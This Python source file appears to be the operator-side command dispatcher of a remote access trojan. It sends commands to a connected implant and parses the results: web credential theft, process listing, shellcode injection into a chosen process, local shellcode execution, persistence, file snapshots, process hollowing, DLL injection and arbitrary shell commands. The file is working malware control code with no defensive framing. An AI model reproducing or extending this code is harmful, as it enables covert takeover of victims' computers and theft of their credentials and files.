from Tools.toolsF import *
from Tools.comandInfo import *
from os import getcwd
from subprocess import Popen, DEVNULL
from os.path import join as pathJoin
import json
import re




class CommandManager(object):

    def __init__(self, writer, reader):
        self.writer = writer
        self.reader = reader
        self.id = None
        self.waitingForResult = False
        self.tag = "root"
     
    def retriveCommand(self, message:dict, getcd=False):
        command = message.get("message").get("command")
        if not self.id: self.id = message.get("id")
        message = message.get("message")
        self.waitingForResult = command is not None and len(command) > 0
        if not self.waitingForResult: 
            return
        
        if command == WEB_CREDENTIALS:
            command = gen_xml(self.tag, command=command, type=message.get("type"),web=message.get("web")) 
            self.writer(command.encode())
            return collect(json.loads(self.reader().decode(errors='replace')))
        
        if command == LIST_PROCESS_INFORMATION:
            self.writer(gen_xml(self.tag, command=command).encode())
            return json.loads(self.reader().decode(errors='replace'))
        
        if command == INJECT_PROCESS_SHELLCODE:
            self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase"), targetPid=message.get("targetPid")).encode())
            status = str(self.reader().decode(errors='replace').strip())
            return tryParse(int, status ,1) == 0
        
        if command == RUN_LOCAL_SHELLCODE:
            self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase")).encode())
            status = self.reader().decode(errors='replace').strip()
            return tryParse(int, status, 1) == 0
        
        if command == PERSITENCE:
            self.writer(gen_xml(self.tag, **message).encode())
            status = self.reader().decode(errors='replace').strip()
            return tryParse(int, status, 1) == 0
        
        if command == FILES_SNAP_FULL:
            print("FILES_SNAP_FULL Selected")
            print(message)
            self.writer(gen_xml(self.tag, **message).encode())
            print('EndProcessing')
            return json.loads(self.reader().decode(errors='replace'))
        
        if command == HOLLOW_FILE_EXEC:
            self.writer(gen_xml(self.tag, **message).encode())
            status = self.reader().decode(errors='replace').strip()
            return tryParse(int, status, 1) == 0
        
        if command == DLL_INJECT:
            self.writer(gen_xml(self.tag, **message).encode())
            status = self.reader().decode(errors='replace').strip()
            return tryParse(int, status, 1) == 0
        
        if command == CREAT_SEPARATED_CONSOLE:
            internalClientPath = pathJoin(getcwd(), "Tools", "internalClient.py")
            execute = EXECUTE_INTERNAL_CLIENT.format(
                internalClientPath, 
                "local", 
                self.id.strip()
            )
            print(execute)
            Popen(execute, shell=True, stdout=DEVNULL, stderr=DEVNULL)
            return
        
        if command.startswith(CHANGE_CWD):
            matchcd = re.match(CHANGE_CWD_PATTERN, command)
            _, path = matchcd.groups()
            command = gen_xml(self.tag, command=CHANGE_CWD, path=path.strip())
            self.writer(command.encode())
            return self.reader().decode(errors='replace')

        if getcd:
            command = gen_xml(self.tag, command=command, getcd="true")
        else:
            command = gen_xml(self.tag, command=command)
        self.writer(command.encode())
        return self.reader().decode(errors='replace')
    
    def _alterRetriveCommand(self,command):
        message = {
            'message': {'command': command} 
        }
        return self.retriveCommand(message, getcd=True)
        
    def isValid(self,*args) -> bool:
        for i in args:
            if i == None:
                return False
        return True
    
    
        
    
    
        

            
